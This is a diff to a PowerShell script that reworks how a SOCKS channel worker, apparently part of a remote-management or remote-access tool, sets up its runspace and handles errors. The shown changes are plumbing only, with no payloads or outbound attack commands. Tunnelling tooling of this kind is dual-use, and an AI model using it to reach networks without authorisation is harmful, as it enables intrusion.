@@ -773,25 +773,7 @@ function Get-RmmSocksWorkerFunctionNames {
     )
 }
 
-function Add-RmmFunctionToInitialSessionState {
-    param(
-        [System.Management.Automation.Runspaces.InitialSessionState]$InitialSessionState,
-        [string]$Name,
-        [System.Management.Automation.ScriptBlock]$ScriptBlock
-    )
-    $entry = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry($Name, $ScriptBlock)
-    if ($null -ne $InitialSessionState.Commands) {
-        $InitialSessionState.Commands.Add($entry) | Out-Null
-        return
-    }
-    if ($null -ne $InitialSessionState.Functions) {
-        $InitialSessionState.Functions.Add($entry) | Out-Null
-        return
-    }
-    throw 'InitialSessionState has no Commands or Functions collection (unsupported host)'
-}
-
-function Import-RmmFunctionsIntoPowerShell {
+function Import-RmmFunctionsIntoRunspace {
     param(
         [System.Management.Automation.PowerShell]$PowerShellInstance,
         [string[]]$FunctionNames
@@ -800,41 +782,39 @@ function Import-RmmFunctionsIntoPowerShell {
         $cmd = Get-Command -Name $name -CommandType Function -ErrorAction Stop
         $null = $PowerShellInstance.AddScript({
             param($FunctionName, $FunctionBody)
-            Set-Item -Path "function:global:$FunctionName" -Value $FunctionBody
+            Set-Item -Path "function:$FunctionName" -Value $FunctionBody -Force
         }, $false).AddArgument($name).AddArgument($cmd.ScriptBlock).Invoke()
+        if ($PowerShellInstance.Streams.Error.Count -gt 0) {
+            $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
+            $PowerShellInstance.Streams.Error.Clear()
+            throw "Failed to import function $name`: $errs"
+        }
         $PowerShellInstance.Commands.Clear()
     }
+    $null = $PowerShellInstance.AddScript(
+        'if (-not (Get-Command Invoke-RmmRestMethod -CommandType Function -ErrorAction SilentlyContinue)) { throw ''SOCKS bootstrap: Invoke-RmmRestMethod missing'' }',
+        $false
+    ).Invoke()
+    if ($PowerShellInstance.Streams.Error.Count -gt 0) {
+        $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
+        $PowerShellInstance.Streams.Error.Clear()
+        throw "SOCKS bootstrap verification failed: $errs"
+    }
+    $PowerShellInstance.Commands.Clear()
 }
 
 function New-RmmSocksRunspace {
     $fnNames = Get-RmmSocksWorkerFunctionNames
-    $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-    try {
-        $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault2()
-    } catch {
-        # Windows PowerShell 5.1 — CreateDefault only
-    }
-    foreach ($name in $fnNames) {
-        $cmd = Get-Command -Name $name -CommandType Function -ErrorAction Stop
-        Add-RmmFunctionToInitialSessionState -InitialSessionState $iss -Name $name -ScriptBlock $cmd.ScriptBlock
-    }
-    $rs = [runspacefactory]::CreateRunspace($iss)
+    $rs = [runspacefactory]::CreateRunspace()
+    $rs.ThreadOptions = 'ReuseThread'
     $rs.Open()
-    $probe = [PowerShell]::Create()
-    $probe.Runspace = $rs
+    $bootstrap = [PowerShell]::Create()
+    $bootstrap.Runspace = $rs
     try {
-        $null = $probe.AddScript('Get-Command Invoke-RmmRestMethod -ErrorAction Stop').Invoke()
-    } catch {
-        $probe.Dispose()
-        $rs.Close()
-        $iss2 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-        $rs = [runspacefactory]::CreateRunspace($iss2)
-        $rs.Open()
-        $probe = [PowerShell]::Create()
-        $probe.Runspace = $rs
-        Import-RmmFunctionsIntoPowerShell -PowerShellInstance $probe -FunctionNames $fnNames
+        Import-RmmFunctionsIntoRunspace -PowerShellInstance $bootstrap -FunctionNames $fnNames
+    } finally {
+        $bootstrap.Dispose()
     }
-    $probe.Dispose()
     return $rs
 }
 
@@ -916,9 +896,25 @@ Write-Host "[*] SOCKS channel worker stopped" -ForegroundColor Yellow
         $script:RmmSocksConnections = @{}
         $script:RmmSocksChannelWasActive = $false
     }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy)
-    $ps.Invoke() | Out-Null
+    $initOut = $ps.Invoke()
+    if ($ps.Streams.Error.Count -gt 0) {
+        $errs = ($ps.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
+        $ps.Streams.Error.Clear()
+        $ps.Dispose()
+        $socksRs.Close()
+        Write-Host "[-] SOCKS channel init failed: $errs" -ForegroundColor Red
+        return
+    }
+    $ps.Commands.Clear()
     [void]$ps.AddScript($workerScript)
-    $async = $ps.BeginInvoke()
+    try {
+        $async = $ps.BeginInvoke()
+    } catch {
+        Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
+        $ps.Dispose()
+        $socksRs.Close()
+        return
+    }
 
     $script:RmmSocksWorker.Running = $true
     $script:RmmSocksWorker.Runspace = $socksRs
